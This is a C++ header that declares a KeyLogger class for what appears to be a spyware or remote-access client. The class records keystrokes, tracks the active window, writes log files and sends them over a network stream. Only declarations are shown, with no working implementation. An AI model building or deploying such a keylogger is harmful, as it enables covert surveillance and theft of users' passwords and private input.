#ifndef CLIENT_KEYLOGGER_H
#define CLIENT_KEYLOGGER_H

#include <iostream>
#include <fstream>
#include <string>
#include <fstream>
#include <atomic>
#include <thread>

#include "../stream/Stream.h"
#include "../Time/Time.h"
#include "../install/Install.h"
#include "../converter/Converter.h"



class KeyLogger {

public:
    explicit KeyLogger(Stream stream,const std::string&);
    bool isRecordingKeys() const;
    void setRecordingKeys(bool isRecording);
    void sendKeyLoggerLog();
    void sendAllKeyLoggerLogs() const;
    bool lastLogExists();
    bool logsExists();
    void tryStart();
private:
    void start();
    const std::wstring pathOfLogs;
    std::wstring logsFileName= generateLogName();
    Stream stream;
    std::atomic<bool> recordingKeys = false;
    std::string tempWindow;
    std::string getCurrentWindow();
    bool checkShift();
    bool checkAltGr();
    void writeCharIntoLogFile(const char *string);
    void writeCharIntoLogFile(char string);
    std::wstring generateLogName();
};


#endif
